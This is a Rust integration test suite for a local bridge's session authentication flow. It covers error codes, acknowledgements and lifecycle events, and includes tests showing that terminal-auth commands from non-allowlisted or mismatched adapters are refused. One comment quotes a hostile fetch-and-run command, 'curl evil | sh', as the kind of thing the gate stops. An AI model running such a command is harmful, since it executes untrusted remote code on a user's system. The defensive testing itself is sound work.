//! Stage X.5d — `session.authenticate` translator + `SessionHandle`
//! matrix tests. Locks the bridge-owned reauth flow so the FE can
//! depend on a stable contract for codes, ack shape, and emitted
//! lifecycle events without needing a real ACP adapter.
//!
//! Coverage (matches the reviewer-required matrix in the X.5d plan):
//!   1. missing `auth_method_id`        → `auth.invalid_payload`
//!   2. non-ACP session                  → `auth.not_supported`
//!   3. unknown method id (advertised)   → `auth.method_not_advertised`
//!   4. terminal method type             → `auth.terminal_capability_disabled`
//!   5. terminal method + terminal-auth  → `session.auth_updated`
//!   6. env_var method type              → `auth.env_var_recreate_required` (+ vars)
//!   7. stale session id                 → `session.not_found` (ack false, no event)
//!
//! Case 6 is the FE-side gap surfaced by the reviewer audit of
//! `bde5a90`: the translator short-circuits before the auth lifecycle
//! branch and emits no `session.auth_failed` event, so `ReauthAction`
//! has to fail-closed on `ack.ok=false` itself. We assert that
//! contract here so the FE companion test (`ack ok=false flips
//! authStatus failed`) cannot drift from the bridge.

#![allow(clippy::useless_conversion)]

use futures::{SinkExt, StreamExt};
use local_bridge::agent_runtime::{
    AgentDefinition, AgentKind, AgentRuntimeRegistry, AgentsConfig, ConfigSource,
    DEFAULT_PERMISSION_TIMEOUT_MS,
};
use local_bridge::audit::AuditFacility;
use local_bridge::auth::{AuthState, PairingStore};
use local_bridge::handoff::HandoffService;
use local_bridge::server::{build_app, AppState};
use local_bridge::session::persistence::PersistenceHealth;
use local_bridge::session::SessionRegistry;
use serde_json::{json, Value};
use std::path::PathBuf;
use std::sync::Arc;
use std::time::{Duration, Instant};
use tokio::net::TcpListener;
use tokio_tungstenite::tungstenite::Message;

const T: Duration = Duration::from_secs(5);

fn target_root() -> PathBuf {
    let m = PathBuf::from(env!("CARGO_MANIFEST_DIR"));
    m.parent().unwrap().parent().unwrap().to_path_buf()
}

fn mock_acp_bin() -> PathBuf {
    let root = target_root();
    for p in [
        root.join("target/debug/mock-acp"),
        root.join("target/release/mock-acp"),
    ] {
        if p.exists() {
            return p;
        }
    }
    panic!("mock-acp binary missing — run `cargo build -p mock-acp`")
}

fn mock_engine_bin() -> PathBuf {
    let root = target_root();
    for p in [
        root.join("target/debug/mock-engine"),
        root.join("target/release/mock-engine"),
    ] {
        if p.exists() {
            return p;
        }
    }
    panic!("mock-engine binary missing — run `cargo build -p mock-engine`")
}

/// Build an ACP registry whose default agent is `mock-acp` with the
/// given `authMethods` JSON array baked into the initialize reply.
fn build_acp_registry_with_auth_methods(auth_methods: Value) -> AgentRuntimeRegistry {
    let raw = serde_json::to_string(&auth_methods).expect("serialize authMethods");
    let agent = AgentDefinition {
        id: "claude-mock".into(),
        label: "Mock ACP".into(),
        kind: AgentKind::Acp,
        command: mock_acp_bin(),
        args: vec!["--acp".into(), "--auth-methods".into(), raw],
        enabled: true,
        permission_timeout_ms: DEFAULT_PERMISSION_TIMEOUT_MS,
        install_hint: None,
        mcp_servers: vec![],
    };
    let cfg = AgentsConfig {
        default_agent_id: agent.id.clone(),
        agents: vec![agent],
        registry_source: None,
    };
    AgentRuntimeRegistry::from_config(cfg, ConfigSource::Embedded)
}

async fn start_bridge_acp(auth_methods: Value) -> (String, Arc<AppState>) {
    let registry = build_acp_registry_with_auth_methods(auth_methods);
    let tmp = tempfile::tempdir().unwrap();
    let audit = Arc::new(AuditFacility::new(tmp.path().to_path_buf()));
    let sessions = SessionRegistry::with_runtime(Arc::new(registry));
    sessions.attach_audit(Arc::clone(&audit));
    let state = Arc::new(AppState {
        started_at: Instant::now(),
        sessions,
        auth: AuthState::new_dev(),
        audit,
        pairing: PairingStore::new(),
        profile_root: PathBuf::from(concat!(
            env!("CARGO_MANIFEST_DIR"),
            "/../../packages/protocol/v1/profiles"
        )),
        handoff: Arc::new(HandoffService::new()),
        persistence: None,
        persistence_health: PersistenceHealth::default(),
        resume_policy: std::sync::Arc::new(local_bridge::config::SessionResumePolicy::default()),
        config_snapshot: std::sync::Arc::new(tokio::sync::RwLock::new(
            local_bridge::config::ConfigSnapshot::default(),
        )),
    });
    std::mem::forget(tmp);
    let app = build_app(Arc::clone(&state));
    let listener = TcpListener::bind("127.0.0.1:0").await.unwrap();
    let addr = listener.local_addr().unwrap();
    tokio::spawn(async move {
        axum::serve(listener, app).await.unwrap();
    });
    (format!("ws://{}/api/sessions/stream", addr), state)
}

async fn start_bridge_mock_engine() -> (String, Arc<AppState>) {
    let tmp = tempfile::tempdir().unwrap();
    let state = Arc::new(AppState {
        started_at: Instant::now(),
        sessions: SessionRegistry::new(mock_engine_bin()),
        auth: AuthState::new_dev(),
        audit: Arc::new(AuditFacility::new(tmp.path().to_path_buf())),
        pairing: PairingStore::new(),
        profile_root: PathBuf::from(concat!(
            env!("CARGO_MANIFEST_DIR"),
            "/../../packages/protocol/v1/profiles"
        )),
        handoff: Arc::new(HandoffService::new()),
        persistence: None,
        persistence_health: PersistenceHealth::default(),
        resume_policy: std::sync::Arc::new(local_bridge::config::SessionResumePolicy::default()),
        config_snapshot: std::sync::Arc::new(tokio::sync::RwLock::new(
            local_bridge::config::ConfigSnapshot::default(),
        )),
    });
    std::mem::forget(tmp);
    let app = build_app(Arc::clone(&state));
    let listener = TcpListener::bind("127.0.0.1:0").await.unwrap();
    let addr = listener.local_addr().unwrap();
    tokio::spawn(async move {
        axum::serve(listener, app).await.unwrap();
    });
    (format!("ws://{}/api/sessions/stream", addr), state)
}

type Ws =
    tokio_tungstenite::WebSocketStream<tokio_tungstenite::MaybeTlsStream<tokio::net::TcpStream>>;

async fn connect_hello(url: &str) -> Ws {
    let (mut ws, _) = tokio_tungstenite::connect_async(url).await.unwrap();
    ws.send(Message::Text(
        json!({ "type": "hello", "protocol_version": 1 })
            .to_string()
            .into(),
    ))
    .await
    .unwrap();
    // Drain welcome.
    let _ = tokio::time::timeout(T, ws.next()).await.unwrap();
    ws
}

async fn create_session(ws: &mut Ws, profile_id: &str) -> String {
    let cmd = json!({
        "v": 1,
        "id": "c1",
        "type": "session.create",
        "session_id": "",
        "payload": { "profile_id": profile_id, "project_root": "/tmp/x" }
    });
    ws.send(Message::Text(cmd.to_string().into()))
        .await
        .unwrap();
    loop {
        let Some(msg) = tokio::time::timeout(Duration::from_secs(15), ws.next())
            .await
            .unwrap()
        else {
            panic!("ws closed before session.ready");
        };
        let Message::Text(txt) = msg.unwrap() else {
            continue;
        };
        let v: Value = serde_json::from_str(&txt).unwrap();
        if v.get("type") == Some(&json!("session.ready")) {
            return v["session_id"].as_str().unwrap().to_string();
        }
        if v.get("ackOf") == Some(&json!("c1")) && v.get("ok") == Some(&json!(false)) {
            panic!("session.create ack failed: {v}");
        }
    }
}

async fn create_session_with_root(ws: &mut Ws, profile_id: &str, project_root: &str) -> String {
    let cmd = json!({
        "v": 1,
        "id": "c1",
        "type": "session.create",
        "session_id": "",
        "payload": { "profile_id": profile_id, "project_root": project_root }
    });
    ws.send(Message::Text(cmd.to_string().into()))
        .await
        .unwrap();
    loop {
        let Some(msg) = tokio::time::timeout(Duration::from_secs(15), ws.next())
            .await
            .unwrap()
        else {
            panic!("ws closed before session.ready");
        };
        let Message::Text(txt) = msg.unwrap() else {
            continue;
        };
        let v: Value = serde_json::from_str(&txt).unwrap();
        if v.get("type") == Some(&json!("session.ready")) {
            return v["session_id"].as_str().unwrap().to_string();
        }
        if v.get("ackOf") == Some(&json!("c1")) && v.get("ok") == Some(&json!(false)) {
            panic!("session.create ack failed: {v}");
        }
    }
}

/// Drain frames after sending a `session.authenticate` cmd until we
/// have both the ack and (optionally) the auth-lifecycle events. The
/// translator emits ack + events back-to-back from one dispatch call,
/// but the broadcast order over the WS is independent so we collect
/// any frame that mentions the cmd id or matches `session.auth_*`.
async fn collect_auth_outcome(
    ws: &mut Ws,
    cmd_id: &str,
    expect_event: bool,
) -> (Value, Vec<Value>) {
    let mut ack: Option<Value> = None;
    let mut events: Vec<Value> = Vec::new();
    let deadline = std::time::Instant::now() + T;
    loop {
        // Stop early once we have ack and (if expected) at least one
        // auth-lifecycle event other than `session.auth_requested`.
        if let Some(a) = &ack {
            let has_terminal = events.iter().any(|e| {
                matches!(
                    e.get("type").and_then(Value::as_str),
                    Some("session.auth_failed") | Some("session.auth_updated")
                )
            });
            if !expect_event || has_terminal {
                return (a.clone(), events);
            }
        }
        let remaining = deadline.saturating_duration_since(std::time::Instant::now());
        if remaining.is_zero() {
            panic!(
                "timeout collecting session.authenticate outcome (cmd_id={cmd_id}, expect_event={expect_event}); ack={ack:?}, events={events:?}"
            );
        }
        let Some(msg) = tokio::time::timeout(remaining, ws.next())
            .await
            .ok()
            .flatten()
        else {
            panic!("ws closed waiting for session.authenticate outcome");
        };
        let Message::Text(txt) = msg.unwrap() else {
            continue;
        };
        let v: Value = serde_json::from_str(&txt).unwrap();
        if v.get("ackOf") == Some(&json!(cmd_id)) {
            ack = Some(v);
            continue;
        }
        if let Some(t) = v.get("type").and_then(Value::as_str) {
            if t == "session.auth_requested"
                || t == "session.auth_failed"
                || t == "session.auth_updated"
            {
                events.push(v);
            }
        }
    }
}

fn auth_send(ws_id: &str) -> Value {
    json!({
        "v": 1,
        "id": ws_id,
        "type": "session.authenticate",
        // session_id and payload filled in by the caller.
    })
}

async fn send_authenticate(ws: &mut Ws, cmd_id: &str, session_id: &str, payload: Value) {
    let mut cmd = auth_send(cmd_id);
    cmd["session_id"] = json!(session_id);
    cmd["payload"] = payload;
    ws.send(Message::Text(cmd.to_string().into()))
        .await
        .unwrap();
}

// -----------------------------------------------------------------
// Test 1: missing `auth_method_id` → ack false `auth.invalid_payload`
//                                  + event `session.auth_failed`.
// -----------------------------------------------------------------
#[tokio::test]
async fn x5d_authenticate_missing_method_id_returns_invalid_payload() {
    let (url, _state) = start_bridge_acp(json!([
        { "id": "claude-login", "type": "agent", "name": "Log in with Claude" }
    ]))
    .await;
    let mut ws = connect_hello(&url).await;
    let project_root = tempfile::tempdir().unwrap();
    let project_root_str = project_root.path().display().to_string();
    let sid = create_session_with_root(&mut ws, "executor.code@1.0.0", &project_root_str).await;

    // Empty string is treated as missing per the translator (filter !is_empty).
    send_authenticate(&mut ws, "a1", &sid, json!({ "auth_method_id": "" })).await;
    let (ack, events) = collect_auth_outcome(&mut ws, "a1", true).await;

    assert_eq!(ack["ok"], json!(false), "ack should be false: {ack}");
    assert_eq!(ack["error"]["code"], json!("auth.invalid_payload"));

    let failed = events
        .iter()
        .find(|e| e.get("type") == Some(&json!("session.auth_failed")))
        .expect("session.auth_failed event missing");
    assert_eq!(failed["payload"]["code"], json!("auth.invalid_payload"));
    // No `session.auth_requested` should fire — we short-circuit
    // before that branch on missing payload.
    assert!(
        !events
            .iter()
            .any(|e| e.get("type") == Some(&json!("session.auth_requested"))),
        "unexpected session.auth_requested on invalid_payload: {events:?}"
    );
}

// -----------------------------------------------------------------
// Test 2: non-ACP session → ack false `auth.not_supported`
//                          + event `session.auth_failed`.
// -----------------------------------------------------------------
#[tokio::test]
async fn x5d_authenticate_non_acp_session_returns_not_supported() {
    let (url, _state) = start_bridge_mock_engine().await;
    let mut ws = connect_hello(&url).await;
    let sid = create_session(&mut ws, "executor.code@1.0.0").await;

    send_authenticate(&mut ws, "a2", &sid, json!({ "auth_method_id": "any" })).await;
    let (ack, events) = collect_auth_outcome(&mut ws, "a2", true).await;

    assert_eq!(ack["ok"], json!(false));
    assert_eq!(ack["error"]["code"], json!("auth.not_supported"));

    let failed = events
        .iter()
        .find(|e| e.get("type") == Some(&json!("session.auth_failed")))
        .expect("session.auth_failed missing");
    assert_eq!(failed["payload"]["code"], json!("auth.not_supported"));
}

// -----------------------------------------------------------------
// Test 3: unknown method id → ack false `auth.method_not_advertised`
//                            + event `session.auth_failed`.
// -----------------------------------------------------------------
#[tokio::test]
async fn x5d_authenticate_unknown_method_id_returns_method_not_advertised() {
    let (url, _state) = start_bridge_acp(json!([
        { "id": "claude-login", "type": "agent", "name": "Log in with Claude" }
    ]))
    .await;
    let mut ws = connect_hello(&url).await;
    let sid = create_session(&mut ws, "executor.code@1.0.0").await;

    send_authenticate(
        &mut ws,
        "a3",
        &sid,
        json!({ "auth_method_id": "does-not-exist" }),
    )
    .await;
    let (ack, events) = collect_auth_outcome(&mut ws, "a3", true).await;

    assert_eq!(ack["ok"], json!(false));
    assert_eq!(ack["error"]["code"], json!("auth.method_not_advertised"));

    let failed = events
        .iter()
        .find(|e| e.get("type") == Some(&json!("session.auth_failed")))
        .expect("session.auth_failed missing");
    assert_eq!(
        failed["payload"]["code"],
        json!("auth.method_not_advertised")
    );
    assert_eq!(failed["payload"]["auth_method_id"], json!("does-not-exist"));
}

// -----------------------------------------------------------------
// Test 4: terminal method type → ack false
//                                `auth.terminal_capability_disabled`.
// -----------------------------------------------------------------
#[tokio::test]
async fn x5d_authenticate_terminal_method_returns_capability_disabled() {
    // Stage X.5d (post-4861619 hardening): the allowlist gate fires
    // *first*, so this test uses `gemini-acp` (the only allowlisted
    // agent) to reach the original capability check. With
    // `_meta.terminal-auth` missing, the bridge must still surface
    // `auth.terminal_capability_disabled`.
    let (url, _state) = start_bridge_with_id(
        "gemini-acp",
        json!([
            { "id": "login-terminal", "type": "terminal", "name": "Terminal login" }
        ]),
    )
    .await;
    let mut ws = connect_hello(&url).await;
    let sid = create_session(&mut ws, "executor.code@1.0.0").await;

    send_authenticate(
        &mut ws,
        "a4",
        &sid,
        json!({ "auth_method_id": "login-terminal" }),
    )
    .await;
    let (ack, events) = collect_auth_outcome(&mut ws, "a4", true).await;

    assert_eq!(ack["ok"], json!(false));
    assert_eq!(
        ack["error"]["code"],
        json!("auth.terminal_capability_disabled")
    );

    let failed = events
        .iter()
        .find(|e| e.get("type") == Some(&json!("session.auth_failed")))
        .expect("session.auth_failed missing");
    assert_eq!(
        failed["payload"]["code"],
        json!("auth.terminal_capability_disabled")
    );
    assert_eq!(failed["payload"]["auth_method_type"], json!("terminal"));
}

// -----------------------------------------------------------------
// Test 5: terminal method with `terminal-auth` metadata → launcher
//         runs and surfaces `session.auth_updated`.
// -----------------------------------------------------------------
#[tokio::test]
async fn x5d_authenticate_terminal_method_with_terminal_auth_metadata_returns_ok() {
    // Stage X.5d (post-4861619 hardening): the happy-path now requires
    // (a) an allowlisted agent (`gemini-acp`) and (b) the advertised
    // terminal-auth command basename to match the configured agent
    // command. We satisfy both by pointing the advertised command at
    // the same `mock-acp` binary the bridge spawns for ACP. With
    // stdin /dev/null and no `--acp` flag, mock-acp exits 0 quickly
    // so the auth path completes with `session.auth_updated`.
    let auth_methods = json!([
        {
            "id": "spawn-gemini-cli",
            "type": "terminal",
            "name": "Login with Gemini CLI",
            "_meta": {
                "terminal-auth": {
                    "command": mock_acp_bin().display().to_string(),
                    "args": []
                }
            }
        }
    ]);
    let (url, _state) = start_bridge_with_id("gemini-acp", auth_methods).await;
    let mut ws = connect_hello(&url).await;
    let project_root = tempfile::tempdir().unwrap();
    let project_root_str = project_root.path().display().to_string();
    let sid = create_session_with_root(&mut ws, "executor.code@1.0.0", &project_root_str).await;

    send_authenticate(
        &mut ws,
        "a4b",
        &sid,
        json!({ "auth_method_id": "spawn-gemini-cli" }),
    )
    .await;
    let (ack, events) = collect_auth_outcome(&mut ws, "a4b", true).await;

    assert_eq!(
        ack["ok"],
        json!(true),
        "ack must succeed; events={events:?}"
    );
    let updated = events
        .iter()
        .find(|e| e.get("type") == Some(&json!("session.auth_updated")))
        .expect("session.auth_updated missing");
    assert_eq!(
        updated["payload"]["auth_method_id"],
        json!("spawn-gemini-cli")
    );
    assert_eq!(updated["payload"]["auth_method_type"], json!("terminal"));
    assert_eq!(updated["payload"]["status"]["ok"], json!(true));
}

// -----------------------------------------------------------------
// Test 6: env_var method type → ack false
//                              `auth.env_var_recreate_required`
//                              + payload includes `vars`.
// -----------------------------------------------------------------
#[tokio::test]
async fn x5d_authenticate_env_var_method_returns_env_var_recreate_required() {
    let (url, _state) = start_bridge_acp(json!([
        {
            "id": "env-anthropic",
            "type": "env_var",
            "name": "Anthropic API Key",
            "vars": ["ANTHROPIC_API_KEY"]
        }
    ]))
    .await;
    let mut ws = connect_hello(&url).await;
    let sid = create_session(&mut ws, "executor.code@1.0.0").await;

    send_authenticate(
        &mut ws,
        "a5",
        &sid,
        json!({ "auth_method_id": "env-anthropic" }),
    )
    .await;
    let (ack, events) = collect_auth_outcome(&mut ws, "a5", true).await;

    assert_eq!(ack["ok"], json!(false));
    assert_eq!(
        ack["error"]["code"],
        json!("auth.env_var_recreate_required")
    );

    let failed = events
        .iter()
        .find(|e| e.get("type") == Some(&json!("session.auth_failed")))
        .expect("session.auth_failed missing");
    assert_eq!(
        failed["payload"]["code"],
        json!("auth.env_var_recreate_required")
    );
    assert_eq!(failed["payload"]["auth_method_type"], json!("env_var"));
    // The translator forwards the adapter-advertised `vars` array so
    // the FE can render the exact env var the user must set.
    assert_eq!(
        failed["payload"]["vars"],
        json!(["ANTHROPIC_API_KEY"]),
        "env_var failed payload must include the advertised vars"
    );
}

// -----------------------------------------------------------------
// Test 7: stale session id → ack false `session.not_found`,
//                            NO lifecycle event (FE must fail-closed).
// -----------------------------------------------------------------
#[tokio::test]
async fn x5d_authenticate_stale_session_id_returns_session_not_found_without_event() {
    let (url, _state) = start_bridge_acp(json!([
        { "id": "claude-login", "type": "agent" }
    ]))
    .await;
    let mut ws = connect_hello(&url).await;

    // Don't create a session — send straight to a synthetic id.
    send_authenticate(
        &mut ws,
        "a6",
        "sess_missing_xyz",
        json!({ "auth_method_id": "claude-login" }),
    )
    .await;

    // We expect ack ok=false with `session.not_found` and *no*
    // `session.auth_*` events. Wait briefly after the ack to confirm
    // the bridge does not push a stray lifecycle frame.
    let mut ack: Option<Value> = None;
    let mut auth_events: Vec<Value> = Vec::new();
    let deadline = std::time::Instant::now() + T;
    loop {
        let remaining = deadline.saturating_duration_since(std::time::Instant::now());
        if remaining.is_zero() {
            break;
        }
        let Ok(Some(msg)) = tokio::time::timeout(remaining, ws.next()).await else {
            break;
        };
        let Message::Text(txt) = msg.unwrap() else {
            continue;
        };
        let v: Value = serde_json::from_str(&txt).unwrap();
        if v.get("ackOf") == Some(&json!("a6")) {
            ack = Some(v.clone());
            // Give the bridge ~250ms more to (incorrectly) push an event.
            let extra_deadline = std::time::Instant::now() + Duration::from_millis(250);
            loop {
                let r = extra_deadline.saturating_duration_since(std::time::Instant::now());
                if r.is_zero() {
                    break;
                }
                let Ok(Some(extra)) = tokio::time::timeout(r, ws.next()).await else {
                    break;
                };
                if let Message::Text(et) = extra.unwrap() {
                    let ev: Value = serde_json::from_str(&et).unwrap();
                    if let Some(t) = ev.get("type").and_then(Value::as_str) {
                        if t.starts_with("session.auth_") {
                            auth_events.push(ev);
                        }
                    }
                }
            }
            break;
        }
        if let Some(t) = v.get("type").and_then(Value::as_str) {
            if t.starts_with("session.auth_") {
                auth_events.push(v);
            }
        }
    }

    let ack = ack.expect("never received ack for a6");
    assert_eq!(ack["ok"], json!(false));
    assert_eq!(ack["error"]["code"], json!("session.not_found"));
    assert!(
        auth_events.is_empty(),
        "stale session must not emit any session.auth_* event (got {auth_events:?})"
    );
}

// ----------------------------------------------------------------------------
// Stage X.5d — Gemini terminal-auth allowlist hardening (commit-after-4861619)
// ----------------------------------------------------------------------------

/// Build an ACP registry whose agent has a custom `id` (so we can
/// drive both the allowlisted (`gemini-acp`) and non-allowlisted
/// branches of the terminal-auth gate).
fn build_acp_registry_with_id_and_auth_methods(
    agent_id: &str,
    auth_methods: Value,
) -> AgentRuntimeRegistry {
    let raw = serde_json::to_string(&auth_methods).expect("serialize authMethods");
    let agent = AgentDefinition {
        id: agent_id.to_string(),
        label: format!("Mock ACP ({agent_id})"),
        kind: AgentKind::Acp,
        command: mock_acp_bin(),
        args: vec!["--acp".into(), "--auth-methods".into(), raw],
        enabled: true,
        permission_timeout_ms: DEFAULT_PERMISSION_TIMEOUT_MS,
        install_hint: None,
        mcp_servers: vec![],
    };
    let cfg = AgentsConfig {
        default_agent_id: agent.id.clone(),
        agents: vec![agent],
        registry_source: None,
    };
    AgentRuntimeRegistry::from_config(cfg, ConfigSource::Embedded)
}

async fn start_bridge_with_id(agent_id: &str, auth_methods: Value) -> (String, Arc<AppState>) {
    let registry = build_acp_registry_with_id_and_auth_methods(agent_id, auth_methods);
    let tmp = tempfile::tempdir().unwrap();
    let audit = Arc::new(AuditFacility::new(tmp.path().to_path_buf()));
    let sessions = SessionRegistry::with_runtime(Arc::new(registry));
    sessions.attach_audit(Arc::clone(&audit));
    let state = Arc::new(AppState {
        started_at: Instant::now(),
        sessions,
        auth: AuthState::new_dev(),
        audit,
        pairing: PairingStore::new(),
        profile_root: PathBuf::from(concat!(
            env!("CARGO_MANIFEST_DIR"),
            "/../../packages/protocol/v1/profiles"
        )),
        handoff: Arc::new(HandoffService::new()),
        persistence: None,
        persistence_health: PersistenceHealth::default(),
        resume_policy: std::sync::Arc::new(local_bridge::config::SessionResumePolicy::default()),
        config_snapshot: std::sync::Arc::new(tokio::sync::RwLock::new(
            local_bridge::config::ConfigSnapshot::default(),
        )),
    });
    std::mem::forget(tmp);
    let app = build_app(Arc::clone(&state));
    let listener = TcpListener::bind("127.0.0.1:0").await.unwrap();
    let addr = listener.local_addr().unwrap();
    tokio::spawn(async move {
        axum::serve(listener, app).await.unwrap();
    });
    (format!("ws://{}/api/sessions/stream", addr), state)
}

/// Non-allowlisted agent advertising a terminal-auth method must be
/// refused with `auth.terminal_auth_not_allowed`. Even if the adapter
/// supplies a perfectly innocent command, the bridge will not run it
/// for an agent that isn't on the allowlist (currently `gemini-acp`).
#[tokio::test]
async fn terminal_auth_rejects_non_allowlisted_agent() {
    let auth_methods = json!([{
        "id": "x-terminal",
        "type": "terminal",
        "name": "Bogus Login",
        "_meta": { "terminal-auth": { "command": "/bin/true", "args": [] } }
    }]);
    // agent id is intentionally NOT "gemini-acp".
    let (url, _state) = start_bridge_with_id("claude-mock", auth_methods).await;
    let mut ws = connect_hello(&url).await;
    let session_id = create_session(&mut ws, "executor.code@1.0.0").await;

    let cmd = json!({
        "v": 1,
        "id": "a1",
        "type": "session.authenticate",
        "session_id": session_id,
        "payload": { "auth_method_id": "x-terminal" }
    });
    ws.send(Message::Text(cmd.to_string().into()))
        .await
        .unwrap();

    let (ack, events) = collect_auth_outcome(&mut ws, "a1", true).await;
    assert_eq!(ack["ok"], json!(false), "ack must fail-closed");
    assert_eq!(
        ack["error"]["code"],
        json!("auth.terminal_auth_not_allowed")
    );
    let failed = events
        .iter()
        .find(|e| e.get("type") == Some(&json!("session.auth_failed")))
        .expect("session.auth_failed event");
    assert_eq!(
        failed["payload"]["code"],
        json!("auth.terminal_auth_not_allowed")
    );
    assert_eq!(failed["payload"]["auth_method_type"], json!("terminal"));
}

/// Even when the agent IS allowlisted (`gemini-acp`), if the adapter
/// advertises a terminal-auth method whose command basename does NOT
/// match the configured agent command, the bridge refuses with
/// `auth.command_invalid`. This is the gate that stops a malicious
/// adapter from advertising e.g. `/bin/sh -c "curl evil | sh"`.
#[tokio::test]
async fn terminal_auth_rejects_adapter_arbitrary_command() {
    // mock-acp basename is `mock-acp`, NOT `echo` — so this advertised
    // entry must be rejected even though the agent is allowlisted.
    let auth_methods = json!([{
        "id": "hostile",
        "type": "terminal",
        "_meta": { "terminal-auth": { "command": "/bin/echo", "args": ["pwn"] } }
    }]);
    let (url, _state) = start_bridge_with_id("gemini-acp", auth_methods).await;
    let mut ws = connect_hello(&url).await;
    let session_id = create_session(&mut ws, "executor.code@1.0.0").await;

    let cmd = json!({
        "v": 1,
        "id": "a2",
        "type": "session.authenticate",
        "session_id": session_id,
        "payload": { "auth_method_id": "hostile" }
    });
    ws.send(Message::Text(cmd.to_string().into()))
        .await
        .unwrap();

    let (ack, events) = collect_auth_outcome(&mut ws, "a2", true).await;
    assert_eq!(ack["ok"], json!(false));
    assert_eq!(ack["error"]["code"], json!("auth.command_invalid"));
    let failed = events
        .iter()
        .find(|e| e.get("type") == Some(&json!("session.auth_failed")))
        .expect("session.auth_failed event");
    assert_eq!(failed["payload"]["code"], json!("auth.command_invalid"));
    assert_eq!(failed["payload"]["auth_method_type"], json!("terminal"));
}

/// `session.ready` for a `gemini-acp` agent must include the
/// bridge-synthesized `spawn-gemini-cli` terminal auth method, even
/// though the underlying ACP adapter (Gemini CLI / mock-acp) didn't
/// advertise any auth method itself.
#[tokio::test]
async fn gemini_session_advertises_synthesized_spawn_gemini_cli() {
    // Empty advertised authMethods — simulates the real Gemini CLI,
    // which doesn't advertise OAuth-style ACP auth methods.
    let (url, _state) = start_bridge_with_id("gemini-acp", json!([])).await;
    let mut ws = connect_hello(&url).await;

    // Capture the session.ready frame so we can introspect auth_methods.
    let cmd = json!({
        "v": 1,
        "id": "c1",
        "type": "session.create",
        "session_id": "",
        "payload": { "profile_id": "executor.code@1.0.0", "project_root": "/tmp/x" }
    });
    ws.send(Message::Text(cmd.to_string().into()))
        .await
        .unwrap();

    let mut ready: Option<Value> = None;
    let deadline = std::time::Instant::now() + Duration::from_secs(15);
    while ready.is_none() {
        let remaining = deadline.saturating_duration_since(std::time::Instant::now());
        if remaining.is_zero() {
            panic!("timed out waiting for session.ready");
        }
        let Some(msg) = tokio::time::timeout(remaining, ws.next()).await.unwrap() else {
            panic!("ws closed before session.ready");
        };
        let Message::Text(txt) = msg.unwrap() else {
            continue;
        };
        let v: Value = serde_json::from_str(&txt).unwrap();
        if v.get("type") == Some(&json!("session.ready")) {
            ready = Some(v);
        }
    }
    let ready = ready.unwrap();
    let methods = ready["payload"]["auth_methods"]
        .as_array()
        .cloned()
        .unwrap_or_default();
    let synth = methods
        .iter()
        .find(|m| m.get("id") == Some(&json!("spawn-gemini-cli")))
        .expect("bridge must synthesize spawn-gemini-cli for gemini-acp");
    assert_eq!(synth["type"], json!("terminal"));
    let cmd_field = synth["_meta"]["terminal-auth"]["command"]
        .as_str()
        .expect("command string");
    // The synthesized command points at the configured agent command
    // (mock-acp in this test), proving the bridge owns the command
    // and didn't take it from anywhere the adapter could influence.
    assert!(
        cmd_field.ends_with("mock-acp") || cmd_field.ends_with("mock-acp.exe"),
        "synthesized command must be the configured agent command, got {cmd_field}"
    );
    let synth_args = synth["_meta"]["terminal-auth"]["args"]
        .as_array()
        .cloned()
        .unwrap_or_default();
    assert!(
        synth_args
            .iter()
            .all(|a| a.as_str() != Some("--acp") && a.as_str() != Some("--experimental-acp")),
        "synthesized args must have ACP runtime flags stripped, got {synth_args:?}"
    );
}
